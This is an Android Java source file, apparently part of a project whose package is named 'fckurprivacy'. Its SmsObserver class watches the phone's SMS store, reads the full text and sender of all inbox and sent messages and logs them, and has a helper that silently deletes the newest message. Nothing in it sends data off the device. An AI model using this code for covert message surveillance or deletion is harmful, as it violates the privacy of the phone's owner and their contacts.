package com.vergermiya.harevost.fckurprivacy.SmsChecker;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;

import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.Telephony;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;

/**
 * Created by harevost on 18-7-16.
 */

public class SmsObserver extends ContentObserver {

    private Context mContext;
    private Handler mHandler;
    private int mRunCount = 1;
    private int mCallbackCount;

    public static Uri SMS_INBOX = Uri.parse("content://sms/inbox");
    public static Uri SMS_SENT = Uri.parse("content://sms/sent");

    public SmsObserver(Context context, Handler handler) {
        super(handler);
        mContext = context;
        mHandler = handler;
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {

        if (mCallbackCount % 3 == 0) { mCallbackCount = 0; }
        mCallbackCount += 1;

        ArrayList<SmsInfo> allInboxSms = new ArrayList<>();
        ArrayList<SmsInfo> allSentSms = new ArrayList<>();
        SmsInfo latestInboxSms = new SmsInfo();
        SmsInfo latestSentSms = new SmsInfo();

        Log.d("Sms onChange", "mRunCount=" + mRunCount);
        Log.d("Sms onChange", "mCallbackCount=" + mCallbackCount);

        if (mRunCount <= 1) {
            allInboxSms = querySmsInfo(mContext, SMS_INBOX);
            allSentSms = querySmsInfo(mContext, SMS_SENT);
            for (SmsInfo sms : allInboxSms) {
                Log.d("Sms onChange", "allInboxSms:" + sms);
            }

            for (SmsInfo sms : allSentSms) {
                Log.d("Sms onChange", "allSentSms:" + sms);
            }
        } else {
            if (mCallbackCount % 3 == 0) {
                latestInboxSms = getLatestSmsInfo(mContext, SMS_INBOX);
                latestSentSms = getLatestSmsInfo(mContext, SMS_SENT);
                Log.d("Sms onChange", "latestInboxSms:" + latestInboxSms);
                Log.d("Sms onChange", "latestSentSms:" + latestSentSms);
            }
        }

        mRunCount += 1;
    }

    public static ArrayList<SmsInfo> querySmsInfo(Context context, Uri mUri) {
        ArrayList<SmsInfo> smsInfos = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = mUri;

        String[] mProjection = new String[] {
                Telephony.Sms.ADDRESS,
                Telephony.Sms.THREAD_ID,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
        };

        Cursor c = contentResolver.query(uri, mProjection, null, null, "date desc");

        if (c != null) {
            while (c.moveToNext()) {
                String phoneNumber = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));

                int smsThreadId = c.getInt(c.getColumnIndex(Telephony.Sms.THREAD_ID));

                long smsDateLong = c.getLong(c.getColumnIndex(Telephony.Sms.DATE));
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String smsDate = dateFormat.format(smsDateLong);

                int smsTypeInt = c.getInt(c.getColumnIndex(Telephony.Sms.TYPE));
                String[] smsType = {"收件", "发件"};

                String smsBody = c.getString(c.getColumnIndex(Telephony.Sms.BODY));

                SmsInfo mSmsInfo = new SmsInfo(phoneNumber, smsThreadId, smsDate, smsType[smsTypeInt - 1], smsBody);
                smsInfos.add(mSmsInfo);
            }
        }
        c.close();
        return smsInfos;
    }

    public static void deleteLatestSms(Context context, Uri uri) {
        ContentResolver contentResolver = context.getContentResolver();

        String[] mProjection = new String[] {
                Telephony.Sms._ID,
                Telephony.Sms.THREAD_ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE
        };

        Cursor c = contentResolver.query(uri, mProjection, null, null, "date desc");
        if (c != null) {
            if (c.moveToFirst()) {
                String smsId = c.getString(c.getColumnIndex(Telephony.Sms._ID));
                contentResolver.delete(uri, "_id=?", new String[]{smsId + ""});
                Log.d("smsInfo", smsId + ":" + c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS)));
            }
        }
        c.close();
    }

    public static SmsInfo getLatestSmsInfo(Context context, Uri uri) {
        SmsInfo mSmsInfo = new SmsInfo();
        ArrayList<SmsInfo> smsInfos = querySmsInfo(context, uri);
        if (!smsInfos.isEmpty()) {
            mSmsInfo = smsInfos.get(0);
        }
        return mSmsInfo;
    }

}
